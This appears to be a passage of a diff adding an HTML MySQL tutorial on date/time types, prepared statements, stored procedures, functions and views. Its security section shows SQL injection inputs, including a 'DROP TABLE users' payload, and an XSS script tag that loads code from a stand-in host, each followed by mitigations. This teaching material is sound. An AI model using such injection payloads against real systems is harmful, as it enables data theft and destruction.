+  <li><span class="line-heading font-code">DATETIME</span>: stored both date and time in the format of <span class="line-heading font-code">'YYYY-MM-DD HH:MM:SS'</span> where the date and time are separated by a space. The valid range is <code>'1000-01-01 00:00:00'</code> to <code>'9999-12-31 23:59:59'</code>. You could apply functions <code>NOW()</code> or <code>CURDATE()</code> (time will be set to <code>'00:00:00'</code>) on this field, but not <code>CURTIME()</code>.</li>
+  <li><span class="line-heading font-code">DATE</span>: stored date only in the format of <span class="line-heading font-code">'YYYY-MM-DD'</span>. The range is <code>'1000-01-01'</code> to <code>'9999-12-31'</code>. You could use <code>CURDATE()</code> or <code>NOW()</code> (the returned time portion discarded) for this field.</li>
+  <li><span class="line-heading font-code">TIME</span>: stored time only in the format of <span class="line-heading font-code">'HH:MM:SS'</span>. You could use <code>CURTIME()</code> or <code>NOW()</code> (the returned date portion discarded) for this field.</li>
+  <li><span class="line-heading font-code">YEAR(4|2)</span>: in <code>'YYYY'</code> or <code>'YY'</code>. The range of years is 1901 to 2155. Use <code>DATE</code> type for year outside this range. You could also use <code>CURDATE()</code> to retrieve the current year value for this field (month and day discarded).</li>
+</ul>
+<ul>
+  <li><span class="line-heading font-code">TIMESTAMP</span>: similar to <code>DATETIME</code> but stored the number of seconds since January 1, 1970 UTC (Unix-style). The range is <code>'1970-01-01 00:00:00'</code> to <code>'2037-12-31 23:59:59'</code>.<br />
+The differences between <code>DATETIME</code> and <code>TIMESTAMP</code> are:
+<ol>
+<li>the range,</li>
+<li>support for time zone,</li>
+<li><code>TIMESTAMP</code> column could be declared with <code>DEFAULT CURRENT_TIMESTAMP</code> to set the default value to the current date/time. (All other data types' default, including <code>DATETIME</code>, must be a constant and not a function return value). You can also declared with <code>ON UPDATE CURRENT_TIMESTAMP</code> to capture the timestamp of the last update. </li>
+</ol>
+</li>
+</ul>
+<p>The date/time value can be entered manually as a string literal (e.g., <code>'2010-12-31 23:59:59'</code> for <code>DATAETIME</code>). MySQL will issue a warning and insert all zeros (e.g., <code>'0000-00-00 00:00:00' for <code>DATAETIME</code></code>), if the value of date/time to be inserted is invalid or out-of-range. <code>'0000-00-00'</code> is called a &quot;dummy&quot; date.</p>
+
+<p><span class="line-heading">Example (Testing DATE/TIME Data Types):</span></p>
+<ol>
+  <li>Create a table with various date/time columns. Only the <code>TIMESTAMP</code> column can have the <code>DEFAULT</code> and <code>ON UPDATE</code> as <code>CURRENT_TIMESTAMP</code>.
+
+<pre class="color-example">
+<strong>CREATE TABLE IF NOT EXISTS `datetime_arena` (
+   `desc`        VARCHAR(50)  DEFAULT NULL,
+   `cDateTime`   DATETIME     DEFAULT '0000-00-00 00:00:00',
+   `cDate`       DATE         DEFAULT '0000-00-00',
+   `cTime`       TIME         DEFAULT '00:00:00',
+   `cYear`       YEAR         DEFAULT '0000',
+   `cYear2`      YEAR(2)      DEFAULT '00',
+   `cTimeStamp`  TIMESTAMP    DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
+);</strong>
+   
+<strong>DESCRIBE `datetime_arena`;</strong>
++-------------+-------------+------+-----+---------------------+-----------------------------+
+| Field       | Type        | Null | Key | Default             | Extra                       |
++-------------+-------------+------+-----+---------------------+-----------------------------+
+| description | varchar(50) | YES  |     | NULL                |                             |
+| cDateTime   | datetime    | YES  |     | 0000-00-00 00:00:00 |                             |
+| cDate       | date        | YES  |     | 0000-00-00          |                             |
+| cTime       | time        | YES  |     | 00:00:00            |                             |
+| cYear       | year(4)     | YES  |     | 0000                |                             |
+| cYear2      | year(2)     | YES  |     | 00                  |                             |
+| cTimeStamp  | timestamp   | NO   |     | CURRENT_TIMESTAMP   | on update CURRENT_TIMESTAMP |
++-------------+-------------+------+-----+---------------------+-----------------------------+</pre></li>
+
+<li>Insert values manually using string literals.
+  <pre class="color-example">
+<strong>INSERT INTO `datetime_arena` 
+   (`description`, `cDateTime`, `cDate`, `cTime`, `cYear`, `cYear2`)</strong>
+<strong>VALUES 
+   ('Manual Entry', '2001-01-01 23:59:59', '2002-02-02', '12:30:30', '2004', '05');</strong>
+   
+<strong>SELECT * FROM `datetime_arena` WHERE description='Manual Entry';</strong>
++--------------+---------------------+------------+----------+-------+--------+---------------------+
+| description  | cDateTime           | cDate      | cTime    | cYear | cYear2 | cTimeStamp          |
++--------------+---------------------+------------+----------+-------+--------+---------------------+
+| Manual Entry | 2001-01-01 23:59:59 | 2002-02-02 | 12:30:30 |  2004 |     05 | 2010-04-08 14:44:37 |
++--------------+---------------------+------------+----------+-------+--------+---------------------+</pre>
+</li>
+
+  <li>Checking the on-update for <code>TIMSTAMP</code>.
+  <pre class="color-example">
+<strong>UPDATE `datetime_arena` SET `cYear2`='99' WHERE description='Manual Entry';</strong>
+   
+<strong>SELECT * FROM `datetime_arena` WHERE description='Manual Entry';</strong>
++--------------+---------------------+------------+----------+-------+--------+---------------------+
+| description  | cDateTime           | cDate      | cTime    | cYear | cYear2 | cTimeStamp          |
++--------------+---------------------+------------+----------+-------+--------+---------------------+
+| Manual Entry | 2001-01-01 23:59:59 | 2002-02-02 | 12:30:30 |  2004 |     99 | 2010-04-08 14:44:48 |
++--------------+---------------------+------------+----------+-------+--------+---------------------+</pre>
+</li>
+
+  <li>Insert values using MySQL built-in functions <code>now()</code>, <code>curdate()</code>, <code>curtime()</code>.
+
+<pre class="color-example">
+<strong>INSERT INTO `datetime_arena` 
+   (`description`, `cDateTime`, `cDate`, `cTime`, `cYear`, `cYear2`)
+VALUES
+   ('Built-in Functions', now(), curdate(), curtime(), now(), now());</strong>
+   
+<strong>SELECT * FROM `datetime_arena` WHERE description='Built-in Functions';</strong>
++--------------------+---------------------+------------+----------+-------+--------+---------------------+
+| description        | cDateTime           | cDate      | cTime    | cYear | cYear2 | cTimeStamp          |
++--------------------+---------------------+------------+----------+-------+--------+---------------------+
+| Built-in Functions | 2010-04-08 14:45:48 | 2010-04-08 | 14:45:48 |  2010 |     10 | 2010-04-08 14:45:48 |
++--------------------+---------------------+------------+----------+-------+--------+---------------------+</pre>
+</li>
+
+  <li>Insert invalid or out-of-range values. MySQL replaces with all zeros.
+<pre class="color-example">
+<strong>INSERT INTO `datetime_arena` 
+   (`description`, `cDateTime`, `cDate`, `cTime`, `cYear`, `cYear2`)
+VALUES
+   ('Error Input', '2001-13-31 23:59:59', '2002-13-31', '12:61:61', '99999', '999');</strong>
+   
+<strong>SELECT * FROM `datetime_arena` WHERE description='Error Input';</strong>
++-------------+---------------------+------------+----------+-------+--------+---------------------+
+| description | cDateTime           | cDate      | cTime    | cYear | cYear2 | cTimeStamp          |
++-------------+---------------------+------------+----------+-------+--------+---------------------+
+| Error Input | 0000-00-00 00:00:00 | 0000-00-00 | 00:00:00 |  0000 |     00 | 2010-04-08 14:46:10 |
++-------------+---------------------+------------+----------+-------+--------+---------------------+</pre>
+</li>
+
+  <li>An useful built-in function <code>INTERVAL</code> can be used to compute a future date, e.g.,
+  <pre class="color-example">
+<strong>SELECT `cDate`, `cDate` + INTERVAL 30 DAY, `cDate` + INTERVAL 1 MONTH FROM `datetime_arena`;</strong>
++------------+---------------------------+----------------------------+
+| cDate      | `cDate` + INTERVAL 30 DAY | `cDate` + INTERVAL 1 MONTH |
++------------+---------------------------+----------------------------+
+| 2002-02-02 | 2002-03-04                | 2002-03-02                 |
+| 2010-04-08 | 2010-05-08                | 2010-05-08                 |
+| 0000-00-00 | NULL                      | NULL                       |
++------------+---------------------------+----------------------------+</pre>
+</li>
+
+</ol>
+
+<p><span class="line-heading">Example (Creation and Last Update <span class="font-code">TIMESTAMP</span>):</span> In MySQL, you can have only one <code>TIMESTAMP</code> column with <code>DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP</code>. To maintain both the creation and last updated timestamp, set the creation column to default 0 and insert a <code>NULL</code> to get the <code>CURRENT_TIMESTAMP</code>.</p>
+
+<pre class="color-example">
+CREATE TABLE timestamp_arena (
+   `desc` VARCHAR(30),
+   <span class="color-new">created TIMESTAMP DEFAULT 0,
+   last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP</span>);
+
+<span class="color-comment">-- INSERT NULL to created which results in CURRENT_TIMESTAMP</span>
+INSERT INTO timestamp_arena VALUE ('Created', NULL, NULL);
+
+SELECT * FROM timestamp_arena;
++---------+---------------------+---------------------+
+| desc    | created             | last_updated        |
++---------+---------------------+---------------------+
+| Created | 2012-10-29 20:22:06 | 2012-10-29 20:22:06 |
++---------+---------------------+---------------------+
+
+UPDATE timestamp_arena SET `desc`='Updated';
+
+SELECT * FROM timestamp_arena;
++---------+---------------------+---------------------+
+| desc    | created             | last_updated        |
++---------+---------------------+---------------------+
+| Updated | 2012-10-29 20:22:06 | 2012-10-29 20:23:04 |
++---------+---------------------+---------------------+</pre>
+
+<h4>Type Casting</h4>
+<p>To parse a string (of digits) into numbers, use function <code>CAST(... AS <em>type</em>)</code> or <code>+0</code>. For example,</p>
+
+<pre class="color-example">
+mysql&gt; <strong>SET @aStr = '1234';</strong>
+   
+mysql&gt; <strong>SELECT @aStr, @aStr+0, CAST(@aStr AS UNSIGNED);</strong>
++-------+---------+-------------------------+
+| @aStr | @aStr+0 | CAST(@aStr AS UNSIGNED) |
++-------+---------+-------------------------+
+| 1234  |    1234 |                    1234 |
++-------+---------+-------------------------+</pre>
+
+<p>[TODO] more</p>
+
+<h4>Spatial Data Types</h4>
+<ul>
+<li><span class="line-heading font-code">POINT</span>: A point in (x, y) pair.</li>
+<li><span class="line-heading font-code">LINESTRING</span>:</li>
+<li><span class="line-heading font-code">POLYGON</span>:</li>
+<li><span class="line-heading font-code">GEOMETRY</span>:</li>
+<li><span class="line-heading font-code">MULTIPOINT</span>:</li>
+<li><span class="line-heading font-code">MULTILINESTRING</span>:</li>
+<li><span class="line-heading font-code">MULTIPOLYGON</span>:</li>
+<li><span class="line-heading font-code">GEOMETRYCOLLECTION</span>:</li>
+</ul>
+
+<h3>Prepared Statement</h3>
+
+<h4>SQL Injection Attack</h4>
+
+<p>Reference: <a href="http://www.unixwiz.net/techtips/sql-injection.html">Steve Friedl's "SQL Injection Attacks by Example"</a>.</p>
+
+<p></p>
+
+<p>Suppose that your application prompts user for his username/password  and intends to issue the following SQL <code>SELECT</code>:</p>
+<pre class="color-example">
+SELECT password FROM users WHERE user = '<em>username</em>';
+</pre>
+<p>A malicious user may enter &quot;<code>xxxx' OR '1' = '1</code>&quot;, resulted in:</p>
+
+<pre class="color-example">
+SELECT password FROM user WHERE user = <em>'</em>xxxx' OR '1'='1';   <span class="color-comment">// Show all users</span>
+</pre>
+
+<p>What if you have a <code>DELETE</code> command as follows. All the records in the table would be deleted.</p>
+<pre class="color-example">DELETE FROM users WHERE user = '<em>username</em>';
+</pre>
+
+<p>In some situations, you may execute multiple SQL statements, separating them by commas. The malicious user may enter &quot;<code>xxxx'; DROP TABLE users; --</code> &quot;, where -- (or #) is MySQL's end-of-line comment. This results in:</p>
+
+<pre class="color-example">
+SELECT password FROM user WHERE user = <em>'</em>xxxx'; DROP TABLE users; <span class="color-comment">-- '</span>;
+</pre>
+
+<p>The solutions are:</p>
+<ol>
+<li>Always check the input before plugging it into the SQL statement. Replace quotes with their escape characters, i.e., <code>'</code> as <code>\'</code>, and <code>&quot;</code> as <code>\&quot;</code>.</li>
+<li>Grant the <em>least authority</em> necessary to carry out the task, e.g., grant only <code>SELECT</code> (and disallow <code>DELETE</code>, <code>INSERT</code> or even <code>UPDATE</code> - and certainly no <code>DROP TABLE</code> and <code>DROP DATABASE</code>).</li>
+<li>Use a Prepared Statement (as below) or Stored procedure to take the input parameters.</li>
+</ol>
+
+<h4>Prepared Statement</h4>
+
+<p>A <em>prepared statement</em> (or <em>parameterized statement</em>) contains <em>placeholders</em> for input parameters. You can reuse the same prepared statement many times, with different inputs. Prepared statements are often pre-compiled, which are more efficient than the normal statements.</p>
+
+<p>The steps in using prepared statements are:</p>
+<ol>
+<li>Allocate a prepared statement, with placeholders indicated as <code>?</code>.</li>
+<li>Set the inputs.</li>
+<li>Execute the prepared statement with the inputs (for the placeholders).</li>
+<li>Repeat Step 2 and 3 for another execution.</li>
+<li>Deallocate the prepared statement.</li>
+</ol>
+
+<h5>Example</h5>
+
+<pre class="color-example">
+PREPARE pstmt FROM 'SELECT * FROM products WHERE productCode = ? AND quantity &lt;= ?';
+SET @productCode = 'PEC';                    <span class="color-comment">-- Set variables</span>
+SET @quantity = 200;
+EXECUTE pstmt USING @productCode, @quantity;
+    <span class="color-comment">-- list the variables in the same order as the ?'s</span>
+<span class="color-comment"></span> 
+<span class="color-comment">-- Another invocation with different inputs</span>
+SET @quantity = 500;
+EXECUTE pstmt USING @productCode, @quantity;
+ 
+DEALLOCATE PREPARE pstmt;</pre>
+
+
+<h5>Example</h5>
+
+<pre class="color-example">
+SET @query = 'INSERT INTO products VALUES (?, ?, ?, ?, ?)';
+PREPARE pstmt FROM @query;
+SET @productID = NULL;
+SET @productCode = 'PEC';
+SET @name = 'Pencil HB';
+SET @quantity = 500;
+SET @price = 0.49;
+EXECUTE pstmt USING @productID, @productCode, @name, @quantity, @price;  
+    <span class="color-comment">-- list the variables in the same order as the ?'s</span>
+DEALLOCATE PREPARE pstmt;</pre>
+
+
+<h4>HTML Injection Attack</h4>
+<p>There is another similar injection attack called <em>HTML Injection</em> (or <em>Cross-site Scripting</em> or XSS), which may expose the privacy and protection of a web user, but not so much on the security of the system.</p>
+<p>Suppose that you ask users to leave their comments. A malicious user may enter a <code>&lt;script&gt;</code> statement.  For example,</p>
+
+<pre class="color-example">
+&lt;script src='http://xxx.com/malicious.js'&gt;&lt;/script&gt;&lt;script&gt;run();&lt;/script&gt;</pre>
+
+<p>If another user view the page with the comment, the script will be invoked. The malicious script could steal information from your web browser, such as username and password stored in your browser's cookies.</p>
+<p>The solution is always replacing the special HTML characters with their HTML entities (<code>&lt;</code> as <code>&amp;lt;</code>, <code>&gt;</code> as <code>&amp;gt</code>;, <code>&quot;</code> as <code>&amp;quot;</code> and <code>&amp;</code> as <code>&amp;amp;</code>) before echoing back to the user.</p>
+
+<h3>Stored Objects and Programs</h3>
+<p>A stored database object is a set of SQL statements that are stored in the server for subsequent invocation. MySQL stored objects include:</p>
+<ol>
+  <li><span class="line-heading">User-Defined Functions &amp; Stored Procedures</span>: Collectively known as <em>stored routines</em>, that contain a set of SQL statements stored in the server, for subsequent invocation.<br />
+A <em>function</em> takes a set of parameters, performs the programmed operations, and returns a result to the caller.  In addition to the MySQL built-in functions, you can write your own functions using SQL statements. To invoke a function, use <em><code>functionName</code></em><code>(<em>parameters</em>)</code>. You can store the return value in a variable, e.g., <code>SET @<em>variableName</em> := <em>functionName</em>(<em>parameters</em>)</code>; or <code>SELECT <em>functionName</em>(<em>parameters</em>)</code>.<br />
+A <em>procedure</em> is similar 
+  to a function, except that it does not return a value. However, you could use the parameters to pass values between the caller and the procedure by declaring the direction of the parameters as <code>IN</code>, <code>OUT</code>, or <code>INOUT</code> (whereas all parameters for function are restricted to <code>IN</code>). Use <code>CALL</code> statement to invoke a procedure, in the form of <code>CALL <em>procedureName</em>(<em>parameters</em>)</code>.</li>
+  <li><span class="line-heading">Triggers</span>: A trigger is an event handler that is activated upon the occurrence of a particular event, e.g., <code>BEFORE|AFTER INSERT</code>, <code>DELETE</code>, <code>UPDATE</code>. A trigger is associated with a table. For example, you can use a <code>BEFORE INSERT</code> trigger to set the creation <code>TIMESTAMP</code> of the record; or <code>BEFORE DELETE</code> trigger to perform a backup.</li>
+  <li><span class="line-heading">Events</span>: An event is a scheduled task, which runs at the scheduled date/time, and could be recurring.</li>
+  <li><span class="line-heading">Views</span>: A view is a stored query. It is a virtual table with no real data, which is often used to limit the information available to a less-privilege user or produce additional derived columns (such as total price).</li>
+</ol>
+<p>A stored object is associated with a database. You can invoke a routine not belonging to the current database by qualifying the database name, e.g. <code>test.myFunction()</code>, or <code>CALL test.myProcedure()</code>. All stored objects for a database are removed, when the database is dropped.</p>
+<p>You can use <code>CREATE|ALTER|DROP FUNCTION|PROCEDURE|TRIGGER|EVENT|VIEW</code>, to create, alter, or delete the stored objects.</p>
+<p>Before discussing the stored objects, we need to look at the MySQL syntax for programming stored objects.</p>
+<h4>Compound Statement</h4>
+<p>A <em>compound statement</em> comprises multiple statements, treated as a unit.  A compound statement is enclosed within <code>BEGIN ... END</code>. Each of the statements is terminated with <code>';'</code> (called <em>statement delimiter</em>).  As the &quot;statement delimiter&quot; crashes with the &quot;end-of-statement&quot; delimiter of the <code>mysql</code> client (which signals the client to send the statement to the server for processing), we need to use <code>DELIMITER</code> command to temporarily change the &quot;end-of-statement&quot; delimiter for the <code>mysql</code> client. For example,</p>
+<pre class="color-example">
+<span class="color-comment">-- Change the &quot;end-of-statement&quot; delimiter from ';' to '//'</span>
+DELIMITER //
+   
+CREATE PROCEDURE <em>procedureName</em> (<em>parameters</em>)
+BEGIN
+   <span class="color-comment">-- Declaring local variables having scope within BEGIN ... END.</span>
+   DECLARE <em>variableName1</em> [, <em>variablesName2</em> ...] <em>type</em> [DEFAULT <em>value</em>];
+   statement1;
+   ....
+   statementN;
+END//   <span class="color-comment">-- end-of-statement for CREATE PROCEDURE</span>
+
+<span class="color-comment">-- Restore the &quot;end-of-statement&quot; delimiter to default of ';'</span>
+DELIMITER ;</pre>
+
+<h4>Local Variables</h4>
+<p>Within a compound statement enclosed by <code>BEGIN ... END</code>, we can declare local variables using <code>DECLARE</code> statement, specifying its name, type and optional default value. The scope of the local variables is within the <code>BEGIN ... END</code>. We can use the <code>SET</code> command to assign value to the local variables.</p>
+<p>We can also use &quot;<code>SELECT ... INTO <em>variableName1</em> [, <em>variableName2</em> ...]</code>&quot; to assign a value to local variable(s) from a query. The &quot;<code>SELECT ... INTO</code>&quot; should return a single row. You may use &quot;<code>LIMIT 1</code>&quot; to limit the output of <code>SELECT</code> to a single row with proper selection criteria and ordering.</p>
+<h4>Flow Control</h4>
+<p>MySQL supports the <code>IF</code>, <code>CASE</code>, <code>ITERATE</code>, <code>LEAVE  LOOP</code>, <code>WHILE</code>, and <code>REPEAT</code> flow control constructs for stored programs.</p>
+<table class="table-program">
+  <tr>
+    <td><pre class="color-syntax">
+<span class="color-comment"></span><span class="color-comment">-- IF-THEN-ELSE</span>
+IF <em>condition</em> THEN <em>trueStatements</em>;
+[ELSEIF <em>condition</em> THEN <em>trueStatements</em>;]
+[ELSE <em>elseStatements</em>;]
+END IF;</pre></td>
+    <td><pre class="color-example">
+Example
+ 
+ 
+ 
+ </pre></td>
+  </tr>
+  <tr>
+    <td><pre class="color-syntax">
+<span class="color-comment">-- CASE-WHEN with value
+</span>CASE <em>caseValue</em>
+  WHEN <em>value1</em> THEN <em>value1Statements</em>;
+  WHEN <em>value2</em> THEN <em>value2Statements</em>;
+  ......
+  [ELSE <em>elseStatements</em>;]
+END CASE;</pre></td>
+    <td><pre class="color-example">
+Example
+ 
+ 
+ 
+ 
+ 
+ </pre></td>
+  </tr>
+  <tr>
+    <td><pre class="color-syntax">
+<span class="color-comment">-- CASE-WHEN with conditions
+</span>CASE
+  WHEN <em>condition1</em> THEN <em>condition1Statements</em>;
+  WHEN <em>condition2</em> THEN <em>condition2Statements</em>;
+  .......
+  [ELSE <em>elseStatements</em>;]
+END CASE;</pre></td>
+    <td><pre class="color-example">
+Example
+ 
+  
+ 
+ 
+ 
+</pre></td>
+  </tr>
+  <tr>
+    <td><pre class="color-syntax">
+<span class="color-comment">-- REPEAT <em>statements</em> UNTIL the <em>condition</em> is true
+</span>REPEAT <em>falseStatements</em>;
+  UNTIL <em>condition</em>
+END REPEAT;</pre></td>
+    <td><pre class="color-example">
+Example
+ 
+ 
+</pre></td>
+  </tr>
+  <tr>
+    <td><pre class="color-syntax">
+<span class="color-comment">-- WHILE condition is true DO <em>statements</em>
+</span>WHILE <em>condition</em> 
+  DO <em>trueStatements</em>;
+END WHILE;</pre></td>
+    <td><pre class="color-example">
+Example
+ 
+ 
+ </pre></td>
+  </tr>
+  <tr>
+    <td><pre class="color-syntax">
+<span class="color-comment">-- Repeat <em>statements</em>
+</span>[begin_label:] LOOP <em>
+   statements</em>;
+END LOOP [end_label];</pre></td>
+    <td><pre class="color-example">
+Example
+ 
+ 
+ </pre></td>
+  </tr>
+  <tr>
+    <td>
+<pre class="color-syntax">
+<span class="color-comment">-- &quot;break&quot; the flow control construct identified by label</span>
+<em>label</em>: LOOP
+   ......
+   LEAVE <em>label</em>;   <span class="color-comment">-- &quot;Break&quot; the block identified by label</span>
+   ......
+END LOOP</pre></td>
+    <td><pre class="color-example">
+Example
+ 
+ 
+ 
+ 
+ </pre></td>
+  </tr>
+  <tr>
+    <td><pre class="color-syntax">
+<span class="color-comment">-- &quot;continue&quot; to the flow control construct identified by label
+</span><em>label</em>: LOOP
+   ......
+   ITERATE <em>label</em>;
+   ......
+END LOOP</pre></td>
+    <td><pre class="color-example">
+Example
+ 
+ 
+ 
+ 
+ </pre></td>
+  </tr>
+</table>
+
+<p>The following <em>flow-control functions</em> are available:</p>
+
+<table class="table-program">
+  <tr>
+    <td><pre class="color-syntax">
+<span class="color-comment">-- If the <em>condition</em> is true, return <em>trueResult</em>;
+-- otherwise, return <em>falseResult</em>.
+</span>IF(<em>condition</em>, <em>trueResult</em>, <em>falseResult</em>)
+</pre></td>
+    <td><pre class="color-example">
+Example
+ 
+ </pre></td>
+  </tr>
+  <tr>
+    <td><pre class="color-syntax">
+<span class="color-comment">-- If <em>value</em> is NULL, return <em>nullResult</em>;
+-- otherwise, return <em>value</em>.</span>
+IFNULL(<em>value</em>, <em>nullResult</em>)
+</pre></td>
+    <td><pre class="color-example">
+Example
+ 
+ </pre></td>
+  </tr>
+  <tr>
+    <td><pre class="color-syntax">
+<span class="color-comment">-- If <em>value</em> is NULL, return 1 (true);
+-- otherwise return 0 (false).</span>
+ISNULL(<em>value</em>)
+</pre></td>
+    <td><pre class="color-example">
+Example
+ 
+ </pre></td>
+  </tr>
+  <tr>
+    <td><pre class="color-syntax">
+<span class="color-comment">-- If <em>value1</em> equals to <em>value2</em>, return NULL;
+-- otherwise, return <em>value1</em>.</span>
+NULLIF(<em>value1</em>, <em>value2</em>)</pre></td>
+    <td><pre class="color-example">
+Example
+ 
+ </pre></td>
+  </tr>
+</table>
+
+<h4>Stored Procedures</h4>
+<p><span class="line-heading">Syntax:</span></p>
+<pre class="color-syntax">
+CREATE PROCEDURE <em>procedureName</em> (<em>parameter</em>[, ...])
+<em>  statement</em>
+
+<em>parameter</em>:
+  [<span class="underline">IN</span>|OUT|INOUT] <em>parameterName</em> <em>parameterType</em></pre>
+
+<p>You can use parameters to pass data into and receive data from a stored procedure by declaring the direction of the parameters as <code>IN</code>, <code>OUT</code>, or <code>INOUT</code>. The received data are often placed in user-defined variables.</p>
+<p>You can use a compound statement, consisting of multiple statements, as the body of the <code>CREATE PROCEDURE.</code> A compound statement is enclosed between <code>BEGIN</code> and <code>END</code>. As each of the statements is terminated by semi-colon, which crashes with MySQL statement terminator, we have to use <code>DELIMITER</code> to change the MySQL's delimiter.</p>
+
+
+
+<p><span class="line-heading">Example:</span></p>
+
+<pre class="color-example">
+<span class="color-comment">-- Use this table for testing stored procedure</span>
+CREATE TABLE IF NOT EXISTS products (
+   productID    INT UNSIGNED  NOT NULL AUTO_INCREMENT,
+   productCode  CHAR(3)       NOT NULL DEFAULT '',
+   name         VARCHAR(30)   NOT NULL DEFAULT '',
+   quantity     INT UNSIGNED  NOT NULL DEFAULT 0,
+   price        DECIMAL(7,2)  NOT NULL DEFAULT 99999.99,
+   PRIMARY KEY  (productID)
+);
+ 
+INSERT INTO products VALUES 
+   (1001, 'PEN', 'Pen Red',    5000, 1.23),
+   (1002, 'PEN', 'Pen Blue',   8000, 1.25),
+   (1003, 'PEN', 'Pen Black',  2000, 1.25),
+   (1004, 'PEC', 'Pencil 2B', 10000, 0.48),
+   (1005, 'PEC', 'Pencil 2H',  8000, 0.49); 
+SELECT * FROM `products`;
+
+<span class="color-comment">-- Define a simple procedure without parameter
+-- The procedure has only one statement</span>
+CREATE PROCEDURE simpleProc()
+SELECT * FROM products;
+
+<span class="color-comment">-- Use CALL to invoke the procedure</span>
+CALL simpleProc;
+
+<span class="color-comment">-- Define a procedure with a compound statement
+-- The compound statement uses ; which crash with MySQL delimiter.
+-- Hence, we change the MySQL delimiter temporary</span>
+DELIMITER //
+CREATE PROCEDURE compoundProc()
+BEGIN  <span class="color-comment">-- A compound statement is enclosed within BEGIN and END</span>
+  SELECT * FROM products;
+  SELECT NOW();
+END//  <span class="color-comment">-- End of MySQL CREATE PROCEDURE statement</span>
+DELIMITER ;  <span class="color-comment">-- Restore MySQL delimiter</span>
+ 
+<span class="color-comment">-- Invoke the procedure</span>
+CALL compoundProc;
+
+<span class="color-comment">-- Define stored procedure with parameters</span>
+DELIMITER //<span class="color-comment"></span>
+
+<span class="color-comment">-- Find the products with `quantity` less than the given `reorderLevel`,
+-- and return the total cost to replenish in `cost`
+-- The parameters could be declared as IN, OUT or INOUT</span>
+CREATE PROCEDURE <strong>reorderCost</strong> (IN reorderLevel INT, OUT cost DECIMAL(8,2))
+<span class="color-comment"></span>BEGIN
+  SELECT IFNULL(sum(price*(reorderLevel-quantity)), 0) INTO cost
+  FROM products
+  WHERE quantity &lt; reorderLevel;
+END//
+
+DELIMITER ;     <span class="color-comment">-- restore the default delimiter ';'</span>
+ 
+<span class="color-comment">-- Call the stored procedure. Pass in input parameter, and receive output in a variable</span>
+<strong>CALL reorderCost(5000, @cost);</strong>
+   
+<span class="color-comment">-- Show the return value</span>
+<strong>SELECT @cost;</strong>
++--------+
+| @cost  |
++--------+
+| 353.00 |
++--------+
+ 
+<span class="color-comment">-- Test IFNULL() in the procedure</span>
+<strong>CALL reorderCost(1000, @cost);</strong>
+
+<strong>SELECT @cost;</strong>
++-------+
+| @cost |
++-------+
+|  0.00 |
++-------+</pre>
+
+<p>You can optionally use &quot;<code>DEFINER</code>&quot; and &quot;<code>SQL SECURITY</code>&quot; to control user access to the stored procedure:</p>
+
+<pre class="color-syntax">
+CREATE
+  <strong>DEFINER=<span class="underline">CURRENT_USER</span>|'<em>user</em>'@'<em>host</em>'
+  SQL SECURITY <span class="underline">DEFINER</span>|INVOKER</strong>
+  PROCEDURE procedureName (<em>parameter</em>[, ...])
+    <em>statements</em></pre>
+
+<p>If <code>SQL SECURITY DEFINER</code> is used, the procedure executes with the privileges of <code>DEFINER</code> user no matter which user invokes it. If <code>SQL SECURITY INVOKER</code> is used, the procedure executes with the privileges of <code></code>the user who invoke it. The default <code>DEFINER</code> is the current user.</p>
+
+<h4>User-Defined Functions</h4>
+
+<p><span class="line-heading">Syntax:</span></p>
+<pre class="color-syntax">
+CREATE FUNCTION <em>functionName</em> (<em>parameter</em>[, ...]) RETURNS <em>returnType</em>
+<em>  statements</em>;
+  RETURN <em>value</em>;</pre>
+
+<p>A function returns a scalar value, via the statement <code>RETURN</code>. All parameters are <code>IN</code> parameters.</p>
+
+<p><span class="line-heading">Example:</span></p>
+
+<pre class="color-example">
+DELIMITER //
+CREATE FUNCTION sayHello (name VARCHAR(20)) RETURNS VARCHAR(30)
+BEGIN
+   RETURN CONCAT('Hello, ', name, '!');
+END//
+DELIMITER ;</pre> 
+
+<p>To invoke the function, use <em><code>functionName</code></em><code>(<em>parameters</em>)</code>:</p>
+<pre class="color-example">
+mysql&gt; <strong>SELECT sayHello('peter');</strong>
++-------------------+
+| sayHello('peter') |
++-------------------+
+| Hello, peter!     |
++-------------------+</pre>
+
+<p><span class="line-heading">Example:</span></p>
+<pre class="color-example">
+<span class="color-comment">// Define FUNCTION</span>
+DROP FUNCTION IF EXISTS reorderCostFn;
+DELIMITER //
+
+<span class="color-comment">-- Find the products with `quantity` less than the given `reorderLevel`,
+-- and return the total cost to replenish</span>
+CREATE FUNCTION <strong>reorderCostFn</strong> (reorderLevel INT) RETURNS DECIMAL(8,2)
+BEGIN
+  SELECT IFNULL(sum(price*(reorderLevel-quantity)), 0) INTO @cost
+  FROM products 
+  WHERE quantity &lt; reorderLevel;
+ 
+  RETURN @cost;
+END//
+
+DELIMITER ;     <span class="color-comment">-- restore the default delimiter ';'</span>
+   
+<span class="color-comment">-- Invoke the function</span>
+SELECT reorderCostFn(5000) AS Cost;
++---------+
+| Cost    |
++---------+
+| 3750.00 |
++---------+</pre>
+
+
+
+<h4>Views</h4>
+<p>A view is a preset query stored in a database. A view could be useful for improved security by restricting the data available to less-privilege users; or producing derived column (such as total prices from unit prices).</p>
+
+<p><span class="line-heading">Syntax:</span></p>
+<pre class="color-syntax">
+CREATE VIEW <em>viewName</em> (<em>columnList</em>) AS <em>selectStatement</em></pre>
+
+<p><span class="line-heading">Example:</span> Our <code>products</code> table has 5 columns. We can create a view to restrict certain users to two columns, <code>name</code> and <code>price</code>, as follows:</p>
+
+<pre class="color-example">
+<span class="color-comment">-- Create a VIEW which shows only selected columns</span>
+DROP VIEW IF EXISTS products_view;
+
+CREATE VIEW <strong>products_view</strong> (Name, Price)
+AS
+SELECT CONCAT(productCode, ' - ', name), price FROM products;
+
+DESCRIBE products_view;
+   
+SELECT * FROM products_view;
++-----------------+-------+
+| Name            | Price |
++-----------------+-------+
+| PEN - Pen Red   |  1.23 |
+  ......
+ 
+<span class="color-comment">-- Create another VIEW with a derived column</span>
+DROP VIEW IF EXISTS products_total_view;
+ 
+CREATE VIEW <strong>products_total_view</strong>
+AS
+SELECT
+   CONCAT(productCode, ' - ', name) AS Name,
+   quantity AS Quantity,
+   price AS Price,
+   quantity*price AS Total
+FROM products;
+ 
+SELECT * FROM products_total_view;
++-----------------+----------+-------+----------+
+| Name            | Quantity | Price | Total    |
